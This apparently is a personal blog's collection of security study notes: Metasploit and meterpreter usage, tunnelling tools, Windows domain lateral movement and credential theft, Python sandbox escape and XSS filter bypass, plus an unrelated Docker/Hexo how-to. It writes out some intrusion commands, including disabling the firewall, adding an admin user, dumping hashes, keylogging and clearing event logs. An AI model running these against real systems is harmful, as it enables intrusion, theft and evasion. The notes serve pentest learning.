entry.title: Linux RE Gadgets
entry.content:
Before doing Linux binary analysis, utils which are easy to use are essential.
Here are some utils when analysing ELF files or doing analysing on Linux, including ‘-h’ to search and some common usages

Readelf Usages

Install binutils to use.

Help Page

Common Usages

-h –file-header Display the ELF file header

-l –program-headers Display the program headers

-S –section-headers Display the sections’ header

-s –syms Display the symbol table
(useful when want to search some syms, but just check, not locate)

Objdump Usages

Install binutils to use.

Help Page

Common Usages

-d, –disassemble Display assembler contents of executable sections

-f, –file-headers Display the contents of the overall file header

objdump -d -j .plt xxx Display the PLT table(read only)

objdump -R xxx Display the GOT table(read and write)

GDB

Basic

Normally we use gdb to open file by:

After loading the program into gdb, you will have lots of commandss to use.

X Command

When discovering the memory, use x command to check.

So what is commonly used?

Debug Running Process

Debug local process dynamically
First, find the pid of xxx

If return the pid nnn, use

or go into gdb to use

and

to attach gdb to the process

gdb+gdbserver Debug

Use gdb to connect to the stub, which gdbserver creates on the remote host.

First, build the gdbserver for target platform(take arm for e.g.)

Allow program to be debugged

Copy gdbserver to target machine, and run it

At your host

peda

PEDA - Python Exploit Development Assistance for GDB
Key Features:

Enhance the display of gdb: colorize and display disassembly codes, registers, memory information during debugging.
Add commands to support debugging and exploit development (for a full list of commands use peda help):
    aslr -- Show/set ASLR setting of GDB
    checksec -- Check for various security options of binary
    dumpargs -- Display arguments passed to a function when stopped at a call instruction
    dumprop -- Dump all ROP gadgets in specific memory range
    elfheader -- Get headers information from debugged ELF file
    elfsymbol -- Get non-debugging symbol information from an ELF file
    lookup -- Search for all addresses/references to addresses which belong to a memory range
    patch -- Patch memory start at an address with string/hexstring/int
    pattern -- Generate, search, or write a cyclic pattern to memory
    procinfo -- Display various info from /proc/pid/
    pshow -- Show various PEDA options and other settings
    pset -- Set various PEDA options and other settings
    readelf -- Get headers information from an ELF file
    ropgadget -- Get common ROP gadgets of binary or library
    ropsearch -- Search for ROP gadgets in memory
    searchmem|find -- Search for a pattern in memory; support regex search
    shellcode -- Generate or download common shellcodes.
    skeleton -- Generate python exploit code template
    vmmap -- Get virtual mapping address ranges of section(s) in debugged process
    xormem -- XOR a memory region with a key

Installation

GCC

e.g.:

remove canary, NX, PIE, and What a stack boundary=2/4 does
is to ensure that the stack is set up into dword-size/qword-size increments,
this prevents your machine from optimizing the stack.

ptrace, strace, ltrace, ftrace

They are used to tracking system calls and signals for user space processes

show details and exit code

pwntools

Cannot function on Windows because quite a few modules are Linux only

Install in python2

Install in python3

Here is pwntools official docs

Better deploy it at localhost to avoid network delay

other commands

file xxx to recognize file type by magic bytes

checksec xxx to see protection

ldd xxx to show share library

strings [-n16] [-el/eb] -tx/to/td xxx to show strings

hexdump -C xxx to see hex

fdisk -l xxx to see disk

dd if=xxx of=xxx to extract from firmware

entry.title: MSF Pentest Route
entry.content:
Nowadays we have plenty of mature pentest framework that can benefit us from information gathering to penetration testing persistence.

Metasploit Framework Introduction

The most famous one for sure. It can be easily found on Github and Official Site. It is maintained in kali repository.

Here is the whole architecture:

I want to introduce just the usage, but not detailed interpretation, architecture analysis and plugin development.

There are 6 corresponding modules:
auxiliary responsible for info gathering, scanning, sniffing, fingerprint(banner) recognition, password guessing, Dos etc.
exploit responsible for exploiting system vulnerabilities to attack.
payloads responsible for control target after successfully exploiting. Include 3 types:

  • single: all-in-one, a complete pack without dependencies on other packages
  • stagers: transfer a small payload for early connection
  • stages: use stagers connection to download later payload

encoder responsible for encode payload to bypass AntiVirus
nop responsible for improving payload stability and maintaining size
post responsible for post pentest, like getting seneitive info, attack via springboards.

Database Preparation

MSF use PostgreSQL to store reports and infos, and accelerate searching exp speed, but not necessary.

Initialize DB

Make sure you installed PostgreSQL before you want to use, and

After initialization, we check the status

Use DB

About how to utilize db, we always import data from other tools, then analyze it.

Basic Commands

Use msfconsole to enter MSF, you can add parameters allowed in msfconsole -h.

MSF seperates different pen-task with the workspace concept.
Different workspace may contain different global variables.

In MSF use help to see all commands

  • banner is for showing msf info.
  • exit is to quit msf to shell.
  • use is to select modules that I mentioned before.
  • back is for reselection when entered a wrong module.
  • info is for information of modules, like user, options, exploiting condition and available payloads.
  • set and unset are for setting options of a module.
  • setg and unsetg are for global options.
  • search is to find modules with some features. Use search -h to see detailed usage.
  • route is to set proxy/springboard in post pentest. Use route -h to do more.
  • sessions is to manage shells. Use sessions -h to see more.
  • show is to give suitable payload/encoder/option etc. (for specific module we use), like show payloads/show encoders/show options. Use show -h to see more.
  • run or exploit to attack, and after that normally you will get a reverse shell, or a better one –> meterpreter shell with advanced functions.

msfvenom

If you have no exp to use, make a shellcode to let target execute.
msfvenom is part of MSF, used for generate shellcode/payload.

Help Page

Examples

Examples for generate shellcode

And we use exploit/multi/handler‍‍ to receive shell

meterpreter

Use help to see detailed help page

As it is an advanced shell, we can not only execute shell command, but do a lot more in intranet:

  1. Basic part
  • background or bg is to switch current session to background. Use sessions -i n to recovery.
  • sysinfo is to show system information.
  • idletime shows the time since previous operation.
  • enumdesktops is to show how many users logged.
  • cat is to view file.
  • del or rm is to delete file.
  • download is for copy things to local.
  • upload is to copy local file to victim.
  • search is to search files on victim. Use search -h to know how to use.
  • edit has the same usage as vim editor.
  • cd and pwd are for moving in victim pc.
  • lcd and lpwd are for moving in local.
  • ps is to check all process.
  • getuid is to view current user privilege.
  1. Advanced part
  • reboot and shutdown is to control power.
  • getsystem is used for privilege escalation to system.
  • hashdump is for hash dumping.
  • execute is for running software. Use single execute to see detailed functions.
  • migrate <pid> is to migrate meterpreter process to a new process.
  • shell is to get a cmd.
  • run killav is to kill antivirus services.
  • run xxx is to run msf scripts.
  • clearev is to clean your ass.
  1. More monitoring
  • run getgui -e is to start rdp.
  • run getgui -u username -p passwd is to add user.
  • run getgui -f xxxx -e is to forward 3389 to port xxxx.
  • netsh advfirewall set allprofiles state off is to stop firewall.
  • Webscan_list
  • Webscan_stream
  • Webscan_chat
  • steal_token is to steal token of specific pid.
  • use incognito is to load incognito to steal token or fake user.
  • list_tokens –u is to list user token.
  • list_tokens –g is to list user group token.
  • keyscan_start
  • keyscan_dump
  • keyscan_stop
  • screenshot
  • run post/windows/gather/enum_chrome is to get chrome cache.
  • run post/windows/gather/dumplinks is to get latest file operation.
  • run post/windows/gather/enum_firefox is to get firefox cache.
  • run post/windows/gather/enum_ie is to get IE cache.

Go to help page for more options.

How to use modules

First of all we have to get an aim, take ms18_8120_win32k_privesc as an example.

Use Modules

Search it in msfconsole, and select it

Now we are in ms18_8120_win32k_privesc context, and we can use info to see descriptions.

Set Options

If you are familiar with it, then use show options and set to see options and set.

This module depends on meterpreter, so we dont need to set payload for it, while modules like ms08_067_netapi not.

Set Payload

Modules like ms08_067_netapi need to set a payload to let target provides a reverse meterpreter or shell.

Exploit

Finally type run or exploit to attack.

Information Gathering

Before attacking, firstly we have to gather info.

Built-in module

Just search string and you can find scanner you like.
Here I give some examples.
Scan host and port

Gather target asset information

Brute force login

Scan services

As for vulnerabilities scanner, search it by yourself.

NMAP

Plenty parameters:

  1. Host scan
  • -sn – ping to scan host
  • -sA – scan host using TCP ACK
  1. Port scan
  • -oX – export scan report to db_import(mentioned above)
  • -sT – scan ports using TCP three-way handshake
  • -sS – scan ports using TCP SYN (more hidden)
  • -p – set port range, like -p 1-65535
  • -sU – scan UDP ports
  • -Pn – no ping
  • -sF – scan port using FIN (similar to -sX, -sN, but with different flag)
  1. Specific information
  • -O – recognize operation system
  • -sV – produce port service version info
  • -A – comprehensive scan
  1. Disguise
  • -e – assign netcard
  • -S – disguise ip, must with -e and -Pn
  • -D – some other fake ip is needed

db_nmap can be used in msfconsole and store data right in msfdb.
Example:

  1. NSE(Nmap Script Engine)
    You can find them in /usr/share/nmap/scripts/, and use like nmap --script <scriptname> <host ip>
    Example:

Privilege Escalation

When you get a meterpreter, try getsystem is a direct method.
Here are several modules to bypass UAC. All the following base on having meterpreter as session 1.

Furthermore, ms13-081、ms15-051、ms16-032、MS16-016、MS14-068、ms18-8120 can also be used.

Lateral Movement ( Route )

We still need a meterpreter to do the following.
First we print the network

Then we add a route to msf

Or we do port forwarding

Or we set socks proxy

Pentest Persistence

post module provides a lot to use

We have persistence module to help.

Another module metsvc

Steal Credentials

Still in meterpreter, we load mimikatz module to do

Or we forge token by incognito module

Pass-The-Hash

And we have Pass-The-Hash, which means we can login just using LM-Hash and NTLM-Hash.

In msf

Using mimikatz

Or we use regular user hash

entry.title: About Port Forwarding
entry.content:
When performing penetration testing, there are always network connection limits.
Port forwarding can bypass them and provide other advantages.

SSH Tunnel

SSH can automatically encrypt and decrypt all network data between server and client, can also forward network data from other TCP ports via SSH connection, which is called “SSH Tunnel”.

“SSH Tunnel” has two advantages:

  • Encrypt communication data between SSH Client and SSH Server
  • Break through firewall restrictions and build some TCP connections that could not be established before

Basic Config

Configuration files include:

  • Server side config: /etc/ssh/sshd_config
  • Client side config: /etc/ssh/sshd_config
  • User config: ~/.ssh/config

Here are related items

Detailed Parameters

Here are related parameters for building the tunnel

Local Forwarding

Transfer local port data to remote host. Local host is ssh client and application client.

We have 3 objects:

  • Attacker pc
  • VPS with public ip
  • Target/Victim pc

The situation is, VPS is allowd to connect target while attacker isn’t.

If attacker want to connect target’s 3389 to use rdp, on attacker pc we do

The whole process will be:

  1. Attacker connects local 33389
  2. The network data is transferred to VPS using ssh
  3. VPS then connects target 3389

So the ssh tunnel is built from attacker to VPS, and listen attacker pc’s port.

Remote Forwarding

Transfer remote port data to local host. Local host is ssh client but application server.

We have 4 objects:

  • Attacker pc
  • VPS with public ip
  • Target/Victim pc 1, allow internet
  • Target/Victim pc 2, disallow internet

The situation is, only victim 1 is allowed to connect victim 2, and victim 1 can be controlled through internet.

If attacker want to connect victim 2, on victim 1 (controlled) we do

The whole process will be:

  • Attacker connects VPS port 33389
  • VPS transfers data to victim 1 using ssh
  • victim 1 then connect victim 2

So the ssh tunnel is from victim 1 to VPS, but VPS port is listening.

note: it default listens on 127.0.0.1 rather than 0.0.0.0, so we use rinetd to do local port forwarding

Dynamic Forwarding

It is exactly building a SSH encrypted socks4/5 proxy tunnel.

If we are in the same situation as Local Forwarding part gives, but attackers have no information or no target ports of victims, a proxy is needed for infomation gathering.

On attacker pc, we build a ssh tunnel to VPS

ICMP Tunnel

Since the tunnel is established through the ICMP protocol, to let tunnel server process the received ICMP messages, the system’s ICMP response mechanism needs to be disabled to prevent the kernel from responding to the ping packet.

ptunnel

It can build server as springboard or proxy.
On the same server (as a springboard) , we run ptunnel

Then on a client, we do

Connect local listening port to use this tunnel, to reach target host.

icmpsh

It provides ICMP reverse shell.
Click this link to download icmpsh.

Then on client we do

On server we do

Finally a shell is transferred to client.

DNS Tunnel

Intranet generally has strict limits on outbound traffic, but usually do not restrict DNS (UDP 53) requests.

There are two main working modes: direct connection mode and relay mode.
Direct connection mode is like normal proxy.
Relay mode looks like

dnscat2

It is the direct connection mode.

Server side deployment

Client side deployment

  • Compile first

  • Connect secondly

  • Use ‘help’ to see commands

Now we use client to control server.

iodine

It is the relay mode like dns2tcp (another util).
The point is to register server as DNS server with a domain name.

First download it and compile to build

Server side we do

After that server adds a virtual netcard dns0 x.x.x.x to build a new LAN.

Client side we do

After that client also adds dns0 but another ip, and now it connects server via this virtual netcard (build a tunnel).

LCX Forwarding

port forwarding is useful especially in intranet penetration.
Search lcx on Github to get download.

Parameter

These are parameters usages and format

Example

We have 3 objects:

  • Attacker pc
  • VPS with public ip
  • Target/Victim pc in intranet

Still VPS is allowd to connect target while attacker isn’t.

On controlled victim pc in intranet

Then on VPS

Finally on attacker pc

EarthWorm

Which is called EW/ew as well, EarthWorm is capable for SOCKS v5 service setup and port forwarding.
Search ew on Github to get download.

The newest edition is Termite on Github (Official Site Here)

Parameters

EarthWorm has 6 command formats （ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）.

socks type tunnel:

ssocksd  --  start local Socks5 proxy service 
             use  -l
rssocks  --  start local Socks5 service, then transfer to another ip 
             use  -l -e
rcsocks  --  receive Socks5 service, then transfer to another port
             use  -d -e

lcx type tunnel:

lcx_slave, lcx_listen: port forwarding
lcx_tran: port mapping

lcx_slave  -- like lcx -slave
              use  -d -e -f -g
lcx_tran   -- like lcx -tran
              use  -l -f -g
lcx_listen -- like lcx -listen
              use  -l -e

set parameters

-l -- listen port
-d -- transfer to host ip
-e -- transfer to host port
-f -- connect to host ip
-g -- connect to host port
-t -- set time out

Forward proxy

That is normal proxy server.

On the socks server

Then use proxychains, proxifier or other tools to connect

Reverse proxy

For a pc in intranet, it have to provide a reverse socks to VPS with public ip.

On intranet pc

Then on VPS

Use proxychains, proxifier or other tools to connect

LCX type

Here are examples, which is similar to lcx

lcx_tran usage

lcx_listen、lcx_slave usages

A comprehensive example

FRP

It is developed by go on Github, a high-performance reverse proxy application for intranet penetration.

After extraction there are:
frpc frpc_full.ini frpc.ini frps frps_full.ini frps.ini
The first three files are client programs and configuration files, last three are server programs and configuration files.

The situation is, we want to access client(in intranet) through(have to) server –> reverse proxy.

Server side first.
The important part is its config file.

Start server by doing this

Access server 7500 port to see GUI dashboard.

Client side config file

Run client

Then we access server 7001 port to connect client 22 port(ssh service), socks and dns are the same.

reGeorg

It transfers data using web pages (js, php, jsp, asp …).
Download it by

On your VPS to build a socks5 proxy

We use socks5 by connecting VPS_ip:8080

entry.title: Domain Pentest Intro
entry.content:
Penetration testing is always a hot and attractive technology, and perform penetration testing in the windows domain is a fairly pivot part.

Windows Domain

What is it?

A Domain is a logical environment, which is different from Workgroups, and it aims to organize multiple computers logically in the network for centralized management.

Workgroups divides computers into groups simply for better observation, without any futher management.
They should come from the same network(LAN), same physical location, and they share some documents, applitions and system resources.

Domain also seperates computers into groups where pc share files, but they are under the control of Domain Controller.
Different from Workgroups which store policies and passwords locally, in a Domain, (at least) one Domain Controller manage the policies, and saves the password.
It’s not your pc to allow you to login, it’s the Domain Controller that checks your username and password.

It also decides whether you can join the Domain. So the Domain Controller is holding the gate of Domain, ensures security and privacy.
Besides computers belonging to one Domain can be from different network, different LAN in different physical location.

How to use?

After booting up a computer, you can either login into the domain, using Kerberos protocol; or login in this computer, using SAM (Security AccountManager) for NTLM (Windows NT LAN Manager, for pc that not in domain) authentication.

note: SAM is database file storing LM Hash and NTLM Hash.

Domain users can login in every computers instead of the Domain Controller, while Domain Administrator can sign in all the computers.

Pentest route

The main target is to get administrator account in the domain.

In daily working, Domain Administrator may login in users’ pc to help install some softwares or some other stuff, then administrator’s credentials are saved locally, which can be extracted by local user.

So the way to perform penetration is: after controlling one domain member, use it as a springboard to explore all the other members, and find out which one the Domain Administrator logged in.
Then we use tools like mimikatz to dump administrator’s credentials, then take charge of Domain Controller, and finally we control the whole domain.

Additional part

What is Active Directory ? You’ll see it when creating a Domain service (AD DS, Active Directory Domain Service).

Active Directory is the centralized directory service in large-scale network environment architecture, and a distributed service, builtin in Windows Server.

Tree is AD’s data structure. Objects in Active Directory nest like: Domain –> Organization Unit –> Group –> User

Because built on the tree structure, Domain in Active Directory can form Domain Tree, Domain Forest and Root Domain.

There is only one Root Domain in a Domain, first created and at the top level, having no parent domain but child domain.

Domain Pentest Technologies

All of below works only after you have taken a Domain member.

Basic Commands

View network environment: ipconfig /all

Get domain controller IP: dsquery server
Get domain controller host name: net group "domain controllers" /domain
Get domain administrator user name: net group "domain admins" /domain
Get all domain users hostnames:net group "domain computers" /domain
Get all domain users: net user /domain
Get domain user information: net user "username"/domain

  • Here is a special user called krbtgt. It’s used for Kerberos authentication. After obtaining its hash, we can forge a ticket for a pass-the-ticket attack.

View current domain: net config workstation
View domain password policies: net accounts /domain
View patch information: wmic qfe
View operating system type: wmic os

Check whether admin has logged: tasklist /v | find "name-of-domain-admin"
It’s necessary before steal credentials.

Information Gathering

Based on this, a more automated batch processing script(need a ip.txt, check result.txt at last)

Use nbtscan to find host: nbtscan xxx.xxx.xxx.xxx/24
Use netbios to get host MAC: nbtstat -A xxx.xxx.xxx.xxx
Use cmd to scan the host: for /L %I in (1,1,254) DO @ping -w 1 -n 1 x.x.x.%I | findstr "TTL="

Use powershell script to scan hosts

Or load remote script to scan

Use powershell script to scan ports

Or load remote script to scan

Lateral Movement

If Domain Admin didn’t logged in this pc, we have to find one that has been logged.

If we get one local administrator account, use net use to build IPC$ connection, or use wmic commands or rdp or psexec to build connection.

Port Forwarding

With it you are able to use pentest tools on your pc, to scan or attack target in Domain, through Domain network route.

IPC

View target share resources: net view \\IP
View target time: net time \\IP
Build IPC null connection: net use \\xxx.xxx.xxx.xxx\ipc$ "" /user:"domain\username"
Build IPC connection(not null): net use \\xxx.xxx.xxx.xxx\ipc$ "password" /user:"domain\username"
Delete IPC connection: net use \\xxx.xxx.xxx.xxx\ipc$ /del
Having a IPC connection and privileges, mapping target disk c: to local disk z: : net use z: \\xxx.xxx.xxx.xxx\c$
Delete mapping: net use z: /del
Close default IPC share: net use ipc$ /del

note:

  1. IPC null connection is discarded in most windows os nowadays.
  2. No IPC connecting if pot 139 and 445 on target host are closed/filtered.

After IPC connection, we can do:

  • copy file to target: copy \path\to\shell.exe \\x.x.x.x\share\to\folder
  • add scheduled tasks: at \\x.x.x.x time(24-hour, like 20:20) shell.exe (or schtasks)
  • …

PsExec

Get reverse cmdshell in batch processing (needs to prepare scaned hosts ip.txt)

RDP

To control remote desktop, first check whether rdp servoce is on: netstat -ano | find "3389"
If no echo, start it by: REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

Then you can choose to

  • dump hash

    • os before server 2003 using LM HASH which is reversible
    • later os using NTLM HASH and dump only hash (no password in plaintext)

  • add user

    • easy to be detected
    • but it works

Add user: net user testuser testpasswd /add
Add as administrator: net localgroup administrators testuser /add
Check status: net user testuser

Tools

  • PsExec
  • wmi
    • wmic
    • wmiexec.vbs
    • Invoke-WMIMethod
  • WinRM
  • DCOM
  • WCE

Use pentest framework is easier, and before it, using powerview and BloodHound to gather information benefits a lot.

Penetration Testing Persistence (Privilege Maintenance)

To keep controlling and convenient for later connection, pentesters always leave a backdoor, timed task or something in the target pc.

Methods

  • Normal webshell
  • Windows registry key
  • Logon scripts
  • DLL/COM injection
  • Scheduled tasks (at, schtasks)
  • wmi

Tools

  • Pentest framework
  • Powershell
  • NC

Privilege Escalation

Only when you get system(beyond administrator) privilege, can you wholly control the computer.

Methods

  • Public exploit or CVE
  • Using AD features
  • DLL/COM injection
  • Using third-party high-privilege services
  • Forge token
  • Bypass UAC

Tools

  • Pentest framework
  • UACME
  • Forge token
    • Incognito
    • Powershell – Invoke-TokenManipulation.ps1
    • Cobalt Strike – steal_token

Steal Credentials

All accounts who logged in this pc will leave their credentials locally, which can be dumped by tools.

Bad things happen if Domain Admin logged in this pc and got hash stolen.

Basic Methods

  • Export SAM file to extract
  • Access lsass.exe process to get hash
  • Exploit other vlunerabilities to get

Simple Examples

Capture plaintext password

Capture hash

Exploit Hash

  • LM Hash
    1. john –format=lm hash.txt
    2. hashcat -m 3000 -a 3 hash.txt
  • NTLM Hash
    1. john –format=nt hash.txt
    2. hashcat -m 1000 -a 3 hash.txt
  • Net-NTLMv1
    1. john –format=netntlm hash.txt
    2. hashcat -m 5500 -a 3 hash.txt
  • Net-NTLMv2
    1. john –format=netntlmv2 hash.txt
    2. hashcat -m 5600 -a 3 hash.txt

Tools

  • mimikatz
  • procdump
  • QuarksPwDump
  • LaZagne
  • WCE
  • Invoke-WCMDump
  • fgdump
  • mimipenguin

Pass the Ticket

Tickets of every domain member are calculated using hash of krbtgt password, which is normally not changed.
If we control krbtgt or get its password, we can forge any member’s ticket, which is called Golden Ticket.
We can easily take over domain controller using domain admin password.

In windows Domain field it is associatedwith Kerberos. Use msf and mimikatz to exploit with ms14-068.

Pentest framework

  • Metasploit Framework
  • Cobalt Strike
  • Empire
  • NiShang
  • Powersploit

entry.title: First how-to-do note
entry.content:
This is the first note.

First how-to-do note（mysql with docker、hexo）

Due to my project in college, I have to migrate the MYSQL 5.5 environment to MYSQL 8.0 version on my cloud host, but with a problem that I cant start my mysql.service correctly ,I decide to deploy mysql with docker and learning basic docker using skills in the meantime.
By the way I have forgotten how to build my GitHub Pages with hexo, and this time I will give it a summary.

Basic Steps for MySQL Server Deployment with Docker

Basic Usage

first you need to install docker and test it(using root on debian)

some usages

About MYSQL

then we have a mysql docker, can be accessed by localhost:33060, but some configurations needed

Now we have a mysql docker which can be accessed remotely

GitHub Pages with Hexo

Using Hexo

Node.js is required, and Git is required on Windows

directory structure
.
├── .deploy
├── public //to publish your html
├── scaffolds
├── scripts
├── source
| ├── _drafts
| └── _posts //md files to be generated as html
├── themes //themes’ conf is _config.yml in this dir
├── _config.yml //blog’s configure
└── package.json

common usages

simplify:

hexo n == hexo new
hexo g == hexo generate
hexo s == hexo server
hexo d == hexo deploy

combine:

$ hexo deploy -g
$ hexo server -g
$ hexo d -g
$ hexo s -g

GitHub Part

  1. first you need a github account

  2. then create a repository named : xxx.github.io (xxx => github username)

  3. configure your ssh public-key to login github without password(necessary for windows git)

  • configure git’s username & email (ensure your updates show on the wall)

  • check out whether you have public/private keys

  • if you can see xxx and xxx.pub, it means u got a keypair

  • if not, generate by yourself

  • type some password once, and you have a keypair now

  • then paste strings in xxx.pub to : github index -> head portrait -> Setting -> SSH and GPG keys
    and now you can login github without typing password in ssh or git bash
  1. configure hexo

  • in _config.yml(xxx=>github username):

  • install plugin

  • deploy blog on github

  • sticky post

Notes for Markdown in Hexo

replace < >with < > //maybe not necessary

when using {something...} add {% raw %}at the front and {% endraw %}as the tail,and finally looks like {% raw %}{something...}{% endraw %}in your text to escape { and}
but in the code block sorrounded by three `, do whatever u want.

as for multiple tags in hexo articles writing, use tags:[tag1, tag2, …]

image hosting
https://sm.ms/
tables generator
http://www.tablesgenerator.com/

entry.title: Python Sandbox Escape
entry.content:
In some OJ providing python sandbox, or web site written in python and using template rendering( ssti appears ), your pentest must have something to do with python sandbox escape.

Python2 Sandbox Escape

When you are in a restricted python environment, to get rid of every limits and spawn a shell is the main target, but kind of tricky.
Our final aim is to get shell with the help of os,

and eval/exec,

and pty,

and subprocess,

and commands,

and timeit,

and platform,

and other modules.

import Techniques

You may easily notice that most methods needs import, therefore importing libs is a good choice.

Ways to Import

As defenders will not make it easy, there should be filters and checks to prevent possible attacks.
The basic idea is to check code content, like

But we have other ways to import

  • import

  • __import__

  • importlib

Ways to Reload

Builtin functions work with no need of import, because they are imported automatically along with __builtin__ module being loaded.

Then functions like open(), int() and chr() are equivalent to

Therefore eval(), exec(), execfile() and __import__ can be executed in this way.
Other ways to operate

So if we try to defend, delete them by using

It’s ok because we can recovery the complete module by

While the truth is, reload is a method under __builtin__, so what if it is deleted already?

We have a module called imp to deal this

Notice that a module can be reloaded only after it is imported.

Advanced

We import libs/modules which are already in local file system, so why dont we remove them from disk firstly?
Question is where exactly are they?

Use sys to show path

It surely contains package directory of pip and conda and other related folders.

Show where is a module

Then look at modules under sys

Change something to see what happens

So we guess, python import modules according to sys.modules, defenders can delete modules in this dict for protection.

What’s the deal? We do the reverse.

Ultimate

If sys, os and reload are banned, still a way to bypass?

Sure it is.

If execfile is banned, use file i/o operations to read, then use exec to execute codes. It suits python 3.x

As a defender, delete the module file is the last strike.
Finally it’s hard to bypass, but the server may be fragile for lacking dependencies.

Explore Attrs & Methods

use dir() method or __dict__ attribute, to list all properties and functions under a specific module/class/object.

They have differences, like dir suits every module, while __dict__ may not exist in some.

Besides, dir gives a list, and __dict__ gives a dict containing values.

Bypass String Scanning

Defenders always filter special strings, so we have to change string to bypass.

First we can do python string tricks

and string concatenation

if method name is filtered, use __getattribute__() or __getattr__() or getattr()or __dict__, combine with str concat

Secondly we do characters encoding

Base64 is common

Using Class Object

__mro__ method gives a list of parent classes inherited by this.
MRO( Method Resolution Order ) indicates that it is associated with inheritance mechanism ( python is multi-inherence ).

__subclasses__ method gives a list of subclasses

So we can use __mro__ and __subclasses__ to get object and useful method. __bases__ can also be used, and it is a part of __mro__ list.

We have file io payloads down here

If ssti exists, we can use it to get shell

Ways to get shell

Python3 Sandbox Escape

Builtin Functions

__builtin__ in python 2.x ==> builtins in python3.x, and needs import.
But finally they all have __builtins__, the reference to builtin modules.

File Operations

file in python 2.x => open in python 3.x.

Class Object Payloads

As python 2.x has different inheritance chain with python 3.x, so we
Some payloads in python 3.7

Things Change in different python version environment !!!
so sometimes it will be like

and os._wrap_close

Scripts

Here is a script for generating payloads of ssti in flask using jinja2

Another script for detecting modules with os, sys or __builtin__ that we can exploit. Effective for python 2.x/3.x

entry.title: XSS SUMMARY
entry.content:
《XSS跨站脚本攻击剖析与防御》是一本专门剖析XSS安全的专业书，总共8章，主要包括的内容如下。

  • 第1章 XSS初探，主要阐述了XSS的基础知识，包括XSS的攻击原理和危害。
  • 第2章 XSS利用方式，就当前比较流行的XSS利用方式做了深入的剖析，这些攻击往往基于客户端，从挂马、窃取Cookies、会话劫持到钓鱼欺骗，各种攻击都不容忽视。
  • 第3章 XSS测试和利用工具，介绍了一些常见的XSS测试工具。
  • 第4章 发掘XSS漏洞，着重以黑盒和白盒的角度介绍如何发掘XSS漏洞，以便帮助读者树立安全意识。
  • 第5章 XSS Worm，讲解了Web 2.0的最大威胁——跨站脚本蠕虫，剖析了Web 2.0相关概念和其核心技术，这些知识对于理解和预防XSS Worm十分重要。
  • 第6章 Flash应用安全，就当前的Flash应用安全做出了深入阐述。
  • 第7章 深入XSS原理，讨论一些比较深入的XSS理论。第8章 防御XSS攻击，介绍了一些防范XSS攻击的方法，例如，运用XSS Filter进行输入过滤和输出编码，使用Firefox浏览器的Noscript插件抵御XSS攻击，使用HTTP-only的Cookies同样能起到保护敏感数据的作用。

《XSS跨站脚本攻击剖析与防御》适合网站管理人员、信息/网络安全或相关工作从业者、软件开发工程师，以及任何对Web安全技术感兴趣的读者。

此书讲的不深，但是够全面。此书最大的意义在于带你xss入门。市面上这是唯一一本专门讲xss的书，也是讲的最深最全的。如果你有js基础，看完书至少能保证会玩。

这本书适合前端与白帽子阅读。xss是最近几年比较热门的一个话题。国内并没有几本系统的介绍xss攻击的书籍。推荐。

XSS初探

分类

反射型（恶意参数放到url中诱导用户点击）和持久型（存储型，即页面内存有js恶意代码）

测试XSS的代码

可查看XSS Cheat Sheet，如何构建健壮的XSS代码（相当于反过滤）如下：

  • 无过滤直接<script>,因为总会过滤<>所以基本没啥用

  • 利用html标签的属性值执行XSS
    例：

  • 如果过滤javascript等关键字，可以用Tab、空格和回车符插在其中
    例：

  • 过滤的话，可对标签属性值转码（ASCII或者十进制、十六进制转码）
    例：

  • eval也可使用来执行相应功能，如

  • 可以用\链接十六进制字符串，用eval函数执行十六进制字符串形式脚本构造如下

  • 也可以执行十进制，但需要用到String.fromCharCode()函数来转换成ASCII码值

原型：

变形为:

  • 除去在属性值上做文章，还可以自己产生事件
    例：

  • 在CSS上做文章，html标签的style属性值，和head中的style都可以利用
    例：

  • head标签中

  • 外部CSS引用的利用
    Html文件中：

  • 扰乱过滤规则，以前学习的是对<script>标签各种变形，这里是利用属性值可能实战意义更大

原型：

转换大小写：

大小写混用：

双引号变单引号：

不用引号：

其他

利用expression时构造全角字符来绕过(全角字符处已加粗。全角字符对于英文字符来说只是加了个空格来补两位，这里猜测和上一节tab与空格绕过类似)

使用/ /注释来迷惑因为其会被浏览器忽略

除/**/外，样式标签中\和结束符\0也是被浏览器忽略的

标记混乱示例(利用浏览器解析html注释存在的问题,这里我还需要进一步去理解)：

在一整个网页中，多个<script></script>部分，每部分都传递部分信息，最后用特殊办法将消息拼接，叫做拆分跨站法
我们可以通过eval和replace事件的组合利用，先在其中加入一些冗余符号来进行混淆，再进行替换删除，最终绕过WAF规则，形成我们想要达到的Payload。

终极测试探针:

常用：

shellcode构造与调用

  • 直接在url中带上exploit
  • url中script调用远程服务器的js代码

  • 使用windows.location.hash方法，可以执行在ulr地址栏中的命令，例子如下

  • XSS Downloader 即用一段代码使用XMLHTTP对象，构造get请求获取其他网页上的xss代码文件并执行

  • xss代码存在客户端本地域，如cookie、flash cookie（flash不用之后应该也没他的事了）或者html5提供的localStorage和sessionStorage

XSS利用方式

Cookie的利用

用document.cookie来获取cookie，可直接构造请求，讲客户端cookie送到攻击者自己的网站

进行会话劫持

大致理解为用存储型xss在管理员进行操作时，劫持其会话（劫持此时管理员的http请求，比如添加删除用户的http请求）

网络钓鱼

xss history back

现在学js发现history是存储的，可以直接用响应方法去跳转，那么也应该有响应方法去获取。本书使用的是，css伪类设置中，link.visited属性进行设置，然后根据设置的变化进行匹配，便可以知道先前访问的是哪些网站。

客户端信息刺探

Js代码实现端口扫描、截取剪切板

其他恶意攻击

网页挂马、ddos、xss worm

XSS构造技巧

利用字符编码

如对用户输入进行处理，反斜杠转义’或者”，则可以利用”%c1\”两个字符组合在一起成了一个unicode字符，所以可以构造如下：

这样处理后得到

绕过长度限制

可以应用事件处理函数
可以调用存储在远端的恶意xss代码
可以借用location.hash存储xss然后执行
可以巧用注释符将两个相邻的输入框进行扩展合并，能够绕开对长度的限制

使用base标签

<base>标签并不常用，作用是定义页面上所有使用相对路径的标签的hosting地址
应用到xss中就是将其更改为恶意远程服务器地址，如：

window.name的妙用

不受同源策略限制，可以用来跨域，利用其可以存储xss代码，之后只需要运行eval(name);即可运行

Xss可以按照payload出现的位置进行分类

出现在标签外时要考虑如何构造script标签
标签内时考虑闭合单双引号然后命令执行
标签属性内考虑闭合单双引号再命令执行
事件属性内直接构造命令执行
特殊标签内属性内则需要考虑具体情况
作为地址的时候，情况如下

  • Iframe src
  • Form action
  • Index formaction
  • A href
  • Meta content
  • Object data
  • Embed src
    构造的时候可以使用

不同标签

Img中： 添加属性

Script中：使用

Body中：添加属性

